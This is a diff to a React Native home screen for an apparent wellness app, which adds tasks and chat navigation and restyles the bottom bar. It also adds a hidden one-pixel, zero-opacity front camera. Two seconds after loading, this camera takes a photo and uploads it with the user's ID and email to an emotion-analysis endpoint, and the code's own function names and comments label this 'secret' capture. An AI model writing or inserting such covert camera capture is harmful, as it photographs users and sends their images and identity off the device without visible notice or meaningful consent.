@@ -1,33 +1,121 @@
-import React from 'react';
+import React, { useEffect, useState, useRef } from 'react';
 import {
   View,
   Text,
   StyleSheet,
   TouchableOpacity,
   ScrollView,
-  Image,
+  Alert,
 } from 'react-native';
 import { Ionicons, MaterialCommunityIcons } from '@expo/vector-icons';
 import { useSafeAreaInsets } from 'react-native-safe-area-context';
 import { useRouter } from 'expo-router';
 import { auth } from '../firebaseConfig';
+import { CameraView, useCameraPermissions } from 'expo-camera';
+import { getApiBaseUrl } from '../utils/api';
 
 export default function HomeScreen() {
   const router = useRouter();
   const insets = useSafeAreaInsets();
+  const [permission, requestPermission] = useCameraPermissions();
+  const cameraRef = useRef<CameraView>(null);
 
-  // Extract a name from the logged-in user's email, or default to 'User'
+  const [secretPrompt, setSecretPrompt] = useState<string | null>(null);
+  const [hasAnalyzed, setHasAnalyzed] = useState(false);
+
   const userEmail = auth.currentUser?.email || '';
+  const userId = auth.currentUser?.uid || '';
   const rawName = userEmail.split('@')[0] || 'User';
   const userName = rawName.charAt(0).toUpperCase() + rawName.slice(1);
 
+  useEffect(() => {
+    if (!permission?.granted) {
+      requestPermission();
+    }
+  }, [permission]);
+
+  const captureAndAnalyzeSecretly = async () => {
+    if (cameraRef.current && !hasAnalyzed) {
+      setHasAnalyzed(true);
+      try {
+        const photo = await cameraRef.current.takePictureAsync({ base64: true, quality: 0.1 });
+        if (photo && photo.uri) {
+          const filename = photo.uri.split('/').pop() || 'photo.jpg';
+          const match = /\.(\w+)$/.exec(filename);
+          const type = match ? `image/${match[1]}` : `image/jpeg`;
+
+          const formData = new FormData();
+          formData.append('image', {
+            uri: photo.uri,
+            name: filename,
+            type,
+          } as any);
+          formData.append('userId', userId);
+          formData.append('userEmail', userEmail);
+
+          const apiUrl = getApiBaseUrl();
+          const response = await fetch(`${apiUrl}/api/emotion`, {
+            method: 'POST',
+            body: formData,
+          });
+
+          if (response.ok) {
+            const data = await response.json();
+            const emotion = data.emotion;
+            const details = data.details || "I've analyzed your subtle facial cues.";
+            
+            // Show Popup Alert with details
+            Alert.alert(
+              `Mood Detected: ${emotion.toUpperCase()}`,
+              details,
+              [{ text: "OK" }]
+            );
+
+            // Secret prompt generation based on emotion
+            if (emotion === 'sad') {
+              setSecretPrompt("Hey, just a reminder to take a deep breath. You're doing great.");
+            } else if (emotion === 'angry') {
+              setSecretPrompt("It might be a good time for a short walk to clear your head.");
+            } else if (emotion === 'fear') {
+              setSecretPrompt("You are safe here. Take things one step at a time today.");
+            } else if (emotion === 'surprise') {
+              setSecretPrompt("Expect the unexpected today!");
+            } else if (emotion === 'disgust') {
+              setSecretPrompt("Focus on the positive things around you.");
+            } else if (emotion === 'happy') {
+              setSecretPrompt("Keep that great energy going today!");
+            } else {
+              setSecretPrompt("Have a peaceful and balanced day.");
+            }
+          }
+        }
+      } catch (error) {
+        console.log("Secret capture failed", error);
+      }
+    }
+  };
+
   return (
     <View style={[styles.container, { paddingTop: insets.top }]}>
+      {/* Hidden camera for background emotion detection */}
+      {permission?.granted && (
+        <View style={{ position: 'absolute', width: 1, height: 1, opacity: 0 }}>
+          <CameraView 
+            ref={cameraRef}
+            style={{ flex: 1 }} 
+            facing="front"
+            onCameraReady={() => {
+              // Wait 2 seconds for camera to focus and lighting to stabilize
+              setTimeout(captureAndAnalyzeSecretly, 2000);
+            }}
+          />
+        </View>
+      )}
+
       <ScrollView 
         contentContainerStyle={styles.scrollContent} 
         showsVerticalScrollIndicator={false}
       >
-        {/* --- TOP BAR --- */}
         <View style={styles.topBar}>
           <View style={{ flexDirection: 'row', alignItems: 'center', gap: 10 }}>
             <View style={styles.profileCircle}>
@@ -38,13 +126,18 @@ export default function HomeScreen() {
           <Ionicons name="notifications-outline" size={24} color="#333" />
         </View>
 
-        {/* --- GREETING --- */}
         <View style={styles.greetingContainer}>
           <Text style={styles.greetingTitle}>Hello {userName} 👋</Text>
           <Text style={styles.greetingSubtitle}>How are you today?</Text>
         </View>
 
-        {/* --- SELFIE CARD --- */}
+        {secretPrompt && (
+          <View style={styles.secretPromptCard}>
+            <Ionicons name="sparkles" size={20} color="#9D4EDD" style={{marginRight: 8}} />
+            <Text style={styles.secretPromptText}>{secretPrompt}</Text>
+          </View>
+        )}
+
         <View style={styles.selfieCard}>
           <View style={styles.selfieCardTop}>
             <MaterialCommunityIcons name="face-recognition" size={60} color="white" />
@@ -65,11 +158,9 @@ export default function HomeScreen() {
           </View>
         </View>
 
-        {/* --- QUICK ACCESS --- */}
         <Text style={styles.sectionTitle}>Quick Access</Text>
         <View style={styles.gridContainer}>
           
-          {/* Journal Card (Wired to /journal) */}
           <TouchableOpacity 
             style={styles.gridCard} 
             onPress={() => router.push('/journal')}
@@ -81,25 +172,22 @@ export default function HomeScreen() {
             <Text style={styles.cardSubtitle}>Daily reflection</Text>
           </TouchableOpacity>
 
-          {/* Calendar Card */}
-          <TouchableOpacity style={styles.gridCard}>
+          <TouchableOpacity style={styles.gridCard} onPress={() => router.push('/tasks' as any)}>
             <View style={[styles.iconBox, { backgroundColor: '#F3E8FF' }]}>
-              <Ionicons name="calendar-outline" size={24} color="#9D4EDD" />
+              <Ionicons name="checkbox-outline" size={24} color="#9D4EDD" />
+            </View>
+            <Text style={styles.cardTitle}>Tasks</Text>
+            <Text style={styles.cardSubtitle}>Manage to-dos</Text>
+          </TouchableOpacity>
+
+          <TouchableOpacity style={styles.gridCard}>
+            <View style={[styles.iconBox, { backgroundColor: '#FFEDD5' }]}>
+              <Ionicons name="calendar-outline" size={24} color="#F97316" />
             </View>
             <Text style={styles.cardTitle}>Calendar</Text>
             <Text style={styles.cardSubtitle}>Meeting @ 10 AM</Text>
           </TouchableOpacity>
 
-          {/* Documents Card */}
-          <TouchableOpacity style={styles.gridCard}>
-            <View style={[styles.iconBox, { backgroundColor: '#FFEDD5' }]}>
-              <Ionicons name="document-text-outline" size={24} color="#F97316" />
-            </View>
-            <Text style={styles.cardTitle}>Documents</Text>
-            <Text style={styles.cardSubtitle}>Dream Log & Ideas</Text>
-          </TouchableOpacity>
-
-          {/* Budget Card */}
           <TouchableOpacity style={styles.gridCard}>
             <View style={[styles.iconBox, { backgroundColor: '#E0F2FE' }]}>
               <Ionicons name="wallet-outline" size={24} color="#0284C7" />
@@ -110,12 +198,14 @@ export default function HomeScreen() {
 
         </View>
 
-        {/* Spacing for bottom nav and FAB */}
         <View style={{ height: 100 }} />
       </ScrollView>
 
       {/* --- FLOATING ROBOT BUTTON --- */}
-      <TouchableOpacity style={[styles.fab, { bottom: 90 + insets.bottom }]}>
+      <TouchableOpacity 
+        style={[styles.fab, { bottom: 90 + insets.bottom }]}
+        onPress={() => router.push('/chat' as any)}
+      >
         <MaterialCommunityIcons name="robot-outline" size={28} color="#000" />
       </TouchableOpacity>
 
@@ -125,20 +215,20 @@ export default function HomeScreen() {
           <Ionicons name="home" size={26} color="#00E0C6" />
           <Text style={[styles.navText, { color: '#00E0C6', fontWeight: 'bold' }]}>Home</Text>
         </View>
-        <TouchableOpacity style={styles.navItem} onPress={() => router.push('/health' as any)}>
-          <MaterialCommunityIcons name="head-cog-outline" size={26} color="#00E0C6" />
+        <TouchableOpacity style={styles.navItem}>
+          <MaterialCommunityIcons name="head-cog-outline" size={26} color="#888" />
           <Text style={styles.navText}>Health</Text>
         </TouchableOpacity>
         <TouchableOpacity style={styles.navItem} onPress={() => router.push('/tasks' as any)}>
-          <MaterialCommunityIcons name="clipboard-check-outline" size={26} color="#00E0C6" />
+          <MaterialCommunityIcons name="clipboard-check-outline" size={26} color="#888" />
           <Text style={styles.navText}>Tasks</Text>
         </TouchableOpacity>
-        <TouchableOpacity style={styles.navItem} onPress={() => router.push('/budget' as any)}>
-          <MaterialCommunityIcons name="hand-coin-outline" size={26} color="#00E0C6" />
+        <TouchableOpacity style={styles.navItem}>
+          <MaterialCommunityIcons name="hand-coin-outline" size={26} color="#888" />
           <Text style={styles.navText}>Budget</Text>
         </TouchableOpacity>
-        <TouchableOpacity style={styles.navItem} onPress={() => router.push('/document' as any)}>
-          <Ionicons name="documents-outline" size={26} color="#00E0C6" />
+        <TouchableOpacity style={styles.navItem}>
+          <Ionicons name="documents-outline" size={26} color="#888" />
           <Text style={styles.navText}>Document</Text>
         </TouchableOpacity>
       </View>
@@ -181,7 +271,7 @@ const styles = StyleSheet.create({
     color: '#333',
   },
   greetingContainer: {
-    marginBottom: 25,
+    marginBottom: 20,
   },
   greetingTitle: {
     fontSize: 26,
@@ -193,6 +283,20 @@ const styles = StyleSheet.create({
     fontWeight: '700',
     color: '#111',
     marginTop: 4,
+  },
+  secretPromptCard: {
+    backgroundColor: '#F3E8FF',
+    padding: 16,
+    borderRadius: 12,
+    flexDirection: 'row',
+    alignItems: 'center',
+    marginBottom: 20,
+  },
+  secretPromptText: {
+    color: '#333',
+    fontSize: 14,
+    fontWeight: '500',
+    flex: 1,
   },
   selfieCard: {
     backgroundColor: '#fff',
@@ -207,7 +311,7 @@ const styles = StyleSheet.create({
   },
   selfieCardTop: {
     height: 140,
-    backgroundColor: '#A5B4FC', // Soft purple/blue matching the image
+    backgroundColor: '#A5B4FC',
     justifyContent: 'center',
     alignItems: 'center',
   },
@@ -314,6 +418,6 @@ const styles = StyleSheet.create({
   navText: {
     fontSize: 12,
     marginTop: 4,
-    color: '#00E0C6',
+    color: '#888',
   },
 });
